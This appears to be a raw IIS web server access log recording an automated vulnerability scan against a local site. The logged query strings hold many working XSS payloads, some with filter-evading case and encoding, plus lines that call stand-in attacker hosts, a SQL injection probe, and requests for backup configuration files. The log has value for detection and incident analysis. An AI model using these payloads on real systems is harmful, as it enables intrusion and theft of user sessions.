127.0.0.1, -, 3/23/2019, 1:48:12, W3SVC2, FIREPLACE, 127.0.0.1, 33, 178, 5299, 404, 2, GET, /downloads/site.tar, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 241, 5279, 404, 2, GET, /editors/FCKeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 306, 5356, 404, 2, GET, /lib/flowplayer/flowplayer.swf, config=https://s3-us-west-2.amazonaws.com/bxss/fp.js,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 266, 5267, 404, 2, GET, /.subversion, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 333, 5572, 403, 0, GET, /css/, =%3C%53%63%52%69%50%74%20%3E%57%4D%43%31%289927%29%3C%2F%73%43%72%69%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 279, 5355, 404, 2, GET, /wp-content/themes/twentyfifteen/genericons/example.html, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 239, 5275, 404, 2, GET, /admin/FCKeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 263, 5261, 404, 2, GET, /services, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 248, 5275, 404, 2, GET, /global.asa.orig, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 308, 5360, 404, 2, GET, /flash/flowplayer/flowplayer.swf, config=https://s3-us-west-2.amazonaws.com/bxss/fp.js,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 306, 5356, 404, 2, GET, /swf/flowplayer/flowplayer.swf, config=https://s3-us-west-2.amazonaws.com/bxss/fp.js,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 247, 5291, 404, 2, GET, /admin/scripts/fckeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 305, 5354, 404, 2, GET, /js/flowplayer/flowplayer.swf, config=https://s3-us-west-2.amazonaws.com/bxss/fp.js,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 290, 5377, 404, 2, GET, /wp-content/plugins/jetpack/_inc/genericons/genericons/example.html, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 297, 5554, 403, 0, GET, /downloads/, <a+HrEF=http://www.vulnweb.com></a>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 3, 299, 5538, 403, 0, GET, /css/, =\u003CScRiPt\WMC1(9895)\u003C/sCripT\u003E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 282, 5533, 403, 0, GET, /downloads/, <a+HrEF=jaVaScRiPT:>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 2, 289, 5543, 403, 0, GET, /images/, <ifRAme+sRc=9701.com></IfRamE>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 296, 5541, 403, 0, GET, /downloads/, [url=http://www.vulnweb.com][/url],
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 269, 5512, 403, 0, GET, /project/, 967701%40,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 247, 5273, 404, 2, GET, /web.config.bak, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 331, 5406, 404, 2, GET, /sites/all/modules/flowplayer/flowplayer/flowplayer.swf, config=https://s3-us-west-2.amazonaws.com/bxss/fp.js,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 240, 5277, 404, 2, GET, /manage/fckeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 262, 5259, 404, 2, GET, /_sqladm, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 249, 5277, 404, 2, GET, /web.config.bakup, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 274, 5522, 403, 0, GET, /images/, <A7gq4Q+x=9576>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 296, 5551, 403, 0, GET, /css/, =&lt;ScRiPt&gt;WMC1(9439)&lt;/sCripT&gt;,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 288, 5543, 403, 0, GET, /project/, 1<ScRiPt>sCz5(9747)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 298, 5543, 403, 0, GET, /images/, <img+sRc='http://attacker-9557/log.php?,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 287, 5542, 403, 0, GET, /project/, <WHRV3R>W4GIU[!+!]</WHRV3R>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 299, 5559, 403, 0, GET, /downloads/, }body{acu:Expre/**/SSion(Uh4U(9258))},
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 269, 5511, 403, 0, GET, /images/, =951283%40,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 247, 5273, 404, 2, GET, /web.config.old, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 287, 5542, 403, 0, GET, /project/, <script>sCz5(9754)</script>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 389, 5632, 403, 0, GET, /project/, %3C%53%63%52%3C%53%63%52%69%50%74%3E%49%70%54%3E%73%43%7A%35%28%39%32%34%35%29%3C%2F%73%43%72%3C%53%63%52%69%50%74%3E%49%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 240, 5277, 404, 2, GET, /editor/FCKeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 261, 5257, 404, 2, GET, /sqladm, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 247, 5273, 404, 2, GET, /web.config.tmp, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 294, 5549, 403, 0, GET, /project/, <ScRiPt+%0D%0A>sCz5(9788)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 249, 5295, 404, 2, GET, /mambots/editors/fckeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 261, 5257, 404, 2, GET, /client, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 288, 5542, 403, 0, GET, /images/, =1<ScRiPt>5yqc(9665)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 321, 5576, 403, 0, GET, /project/, <ScRiPt/acu+src=//testasp.vulnweb.com/t/xss.js?9244></ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 236, 5269, 404, 2, GET, /js/FCKeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 299, 5556, 403, 0, GET, /downloads/, ;1EscB%0A1<ScRiPt>Uh4U(9837)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 289, 5546, 403, 0, GET, /downloads/, <WB3AXE>1SWWW[!+!]</WB3AXE>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 287, 5541, 403, 0, GET, /images/, =<WIBNOX>TKDVW[!+!]</WIBNOX>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 259, 5383, 404, 0, GET, /wps/wcm/connect/'+or+'sLeNQ'='sLeNQ, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 276, 1310, 200, 0, GET, /css/main.css, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 248, 5275, 404, 2, GET, /web.config.temp, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 287, 5541, 403, 0, GET, /images/, =<script>5yqc(9007)</script>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 237, 5271, 404, 2, GET, /adm/fckeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 389, 5631, 403, 0, GET, /images/, =%3C%53%63%52%3C%53%63%52%69%50%74%3E%49%70%54%3E%35%79%71%63%28%39%33%37%37%29%3C%2F%73%43%72%3C%53%63%52%69%50%74%3E%49%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 307, 5572, 403, 0, GET, /project/, <video><source+onerror="javascript:sCz5(9848)">,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 294, 5548, 403, 0, GET, /images/, =<ScRiPt+%0D%0A>5yqc(9089)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 297, 5555, 403, 0, GET, /downloads/, 1<ScRiPt>prompt(912061)</ScRiPt>=��,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 276, 1310, 200, 0, GET, /css/main.css, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 249, 5295, 404, 2, GET, /plugins/editors/fckeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 262, 5259, 404, 2, GET, /clients, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 248, 5275, 404, 2, GET, /global.asax.bak, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 292, 5543, 403, 0, GET, /css/, =<a+HrEF=http://www.vulnweb.com></a>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 390, 5493, 404, 0, GET, /downloads/exe/%3C%53%63%52%69%50%74%20%3E%75%54%63%32%289372%29%3C%2F%73%43%72%69%70%54%3E, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 252, 5019, 400, 0, GET, /*~0*/a.aspx, aspxerrorpath=/,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 256, 5254, 404, 0, OPTIONS, /*~0*/a.aspx, aspxerrorpath=/,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 277, 5522, 403, 0, GET, /css/, =<a+HrEF=jaVaScRiPT:>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 313, 5383, 404, 2, GET, /downloads/exe/&lt;ScRiPt&gt;uTc2(9696)&lt;/sCripT&gt;, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 291, 5530, 403, 0, GET, /css/, =[url=http://www.vulnweb.com][/url],
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 292, 5549, 403, 0, GET, /downloads/, <ifRAme+sRc=9758.com></IfRamE>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 277, 5528, 403, 0, GET, /downloads/, <UNTnqU+x=9636>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 321, 5575, 403, 0, GET, /images/, =<ScRiPt/acu+src=//testasp.vulnweb.com/t/xss.js?9638></ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 301, 5549, 403, 0, GET, /downloads/, <img+sRc='http://attacker-9047/log.php?,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 265, 5047, 400, 0, GET, /downloads/exe/*~0*/a.aspx, aspxerrorpath=/,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 272, 5517, 403, 0, GET, /downloads/, =959176%40,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 294, 5548, 403, 0, GET, /css/, =}body{acu:Expre/**/SSion(WMC1(9016))},
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 303, 1310, 200, 0, GET, /css/main.css, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 258, 5251, 404, 2, GET, /cmd, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 269, 5282, 404, 0, OPTIONS, /downloads/exe/*~0*/a.aspx, aspxerrorpath=/,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 284, 5533, 403, 0, GET, /project/, <body+onload=sCz5(9772)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 315, 5341, 404, 2, GET, /downloads/exe/?img acu onmouseover=uTc2(9032) /?, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 248, 5275, 404, 2, GET, /global.asax.old, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 320, 5579, 403, 0, GET, /project/, <img/src="//testasp.vulnweb.com/t/dot.gif"onload=sCz5(9476)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 241, 5275, 404, 2, GET, /WEB-INF/web.xml, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 291, 5548, 403, 0, GET, /downloads/, =1<ScRiPt>Uh4U(9611)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 294, 5545, 403, 0, GET, /css/, =;WvXR1%0A1<ScRiPt>WMC1(9072)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 290, 5547, 403, 0, GET, /downloads/, =<WJL6L0>KH7KJ[!+!]</WJL6L0>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 290, 5547, 403, 0, GET, /downloads/, =<script>Uh4U(9507)</script>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 284, 5535, 403, 0, GET, /css/, =<WQBHXF>EAK2S[!+!]</WQBHXF>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 392, 5637, 403, 0, GET, /downloads/, =%3C%53%63%52%3C%53%63%52%69%50%74%3E%49%70%54%3E%55%68%34%55%28%39%30%31%31%29%3C%2F%73%43%72%3C%53%63%52%69%50%74%3E%49%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 256, 5297, 404, 2, GET, /喇/WEB-INF/web.xml纮.jsp, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 292, 5544, 403, 0, GET, /css/, =1<ScRiPt>prompt(976742)</ScRiPt>=��,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 307, 5571, 403, 0, GET, /images/, =<video><source+onerror="javascript:5yqc(9484)">,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 287, 5538, 403, 0, GET, /css/, =<ifRAme+sRc=9143.com></IfRamE>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 293, 5555, 403, 0, GET, /project/, <img/src=">"+onerror=alert(9522)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 241, 5279, 404, 2, GET, /plugins/fckeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 246, 5283, 404, 2, GET, /喇/WEB-INF/web.xml, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 277, 2502, 200, 0, GET, /css/entry.css, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 277, 2502, 200, 0, GET, /css/entry.css, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 272, 5517, 403, 0, GET, /css/, =<2MdUZ5+x=9132>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 336, 5579, 403, 0, GET, /project/, %3C%53%63%52%69%50%74%20%3E%73%43%7A%35%289554%29%3C%2F%73%43%72%69%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 297, 5554, 403, 0, GET, /downloads/, =<ScRiPt+%0D%0A>Uh4U(9150)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 302, 5545, 403, 0, GET, /project/, \u003CScRiPt\sCz5(9338)\u003C/sCripT\u003E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 304, 2502, 200, 0, GET, /css/entry.css, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 299, 5558, 403, 0, GET, /project/, &lt;ScRiPt&gt;sCz5(9981)&lt;/sCripT&gt;,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 248, 5275, 404, 2, GET, /global.asax.tmp, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 296, 5538, 403, 0, GET, /css/, =<img+sRc='http://attacker-9881/log.php?,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 324, 5581, 403, 0, GET, /downloads/, =<ScRiPt/acu+src=//testasp.vulnweb.com/t/xss.js?9175></ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 284, 5532, 403, 0, GET, /images/, =<body+onload=5yqc(9119)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 274, 2118, 200, 0, GET, /index.html, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 310, 5577, 403, 0, GET, /downloads/, =<video><source+onerror="javascript:Uh4U(9064)">,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 274, 2118, 200, 0, GET, /index.html, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 265, 5265, 404, 2, GET, /restricted, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 301, 2118, 200, 0, GET, /index.html, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 320, 5578, 403, 0, GET, /images/, =<img/src="//testasp.vulnweb.com/t/dot.gif"onload=5yqc(9379)>,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 295, 5550, 403, 0, GET, /project/, <a+HrEF=http://www.vulnweb.com></a>,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 276, 1459, 200, 0, GET, /pig2019.html, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 293, 5554, 403, 0, GET, /images/, =<img/src=">"+onerror=alert(9232)>,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 249, 5277, 404, 2, GET, /global.asax.temp, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 336, 5578, 403, 0, GET, /images/, =%3C%53%63%52%69%50%74%20%3E%35%79%71%63%289642%29%3C%2F%73%43%72%69%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 276, 1459, 200, 0, GET, /pig2019.html, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 280, 5529, 403, 0, GET, /project/, <a+HrEF=jaVaScRiPT:>,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 303, 1459, 200, 0, GET, /pig2019.html, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 258, 5297, 404, 2, GET, /js/Jplayer.swf, jQuery=alert&id=XSS,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 302, 5544, 403, 0, GET, /images/, =\u003CScRiPt\5yqc(9074)\u003C/sCripT\u003E,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 266, 5313, 404, 2, GET, /js/jplayer/Jplayer.swf, jQuery=alert&id=XSS,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 299, 5557, 403, 0, GET, /images/, =&lt;ScRiPt&gt;5yqc(9918)&lt;/sCripT&gt;,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 265, 5311, 404, 2, GET, /assets/js/Jplayer.swf, jQuery=alert&id=XSS,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 287, 5538, 403, 0, GET, /downloads/, =<body+onload=Uh4U(9563)>,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 323, 5584, 403, 0, GET, /downloads/, =<img/src="//testasp.vulnweb.com/t/dot.gif"onload=Uh4U(9742)>,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 243, 5275, 404, 2, GET, /WEB-INF/web.xml, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 296, 5560, 403, 0, GET, /downloads/, =<img/src=">"+onerror=alert(9169)>,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 261, 5257, 404, 2, GET, /_pages, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 339, 5584, 403, 0, GET, /downloads/, =%3C%53%63%52%69%50%74%20%3E%55%68%34%55%289851%29%3C%2F%73%43%72%69%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 294, 5537, 403, 0, GET, /project/, [url=http://www.vulnweb.com][/url],
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 277, 1988, 200, 0, GET, /resource.html, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 261, 5257, 404, 2, GET, /webmin, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 305, 5550, 403, 0, GET, /downloads/, =\u003CScRiPt\Uh4U(9582)\u003C/sCripT\u003E,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 277, 1988, 200, 0, GET, /resource.html, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 232, 5261, 404, 2, GET, /jscripts, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 310, 5339, 404, 2, GET, /downloads/exe/[url=http:/www.vulnweb.com][/url], -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 297, 5555, 403, 0, GET, /project/, }body{acu:Expre/**/SSion(sCz5(9201))},
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 263, 5261, 404, 2, GET, /reseller, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 249, 5277, 404, 2, GET, /global.asax.orig, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 319, 5373, 404, 2, GET, /jwplayer/player.swf, playerready=alert(document.domain)&debug=function(){alert(document.domain)},
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 304, 1988, 200, 0, GET, /resource.html, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 309, 5377, 404, 2, GET, /downloads/exe/}body{acu:Expre/**/SSion(uTc2(9217))}, -,
127.0.0.1, -, 3/24/2019, 19:05:22, W3SVC2, FIREPLACE, 127.0.0.1, 0, 302, 5563, 403, 0, GET, /downloads/, =&lt;ScRiPt&gt;Uh4U(9061)&lt;/sCripT&gt;,
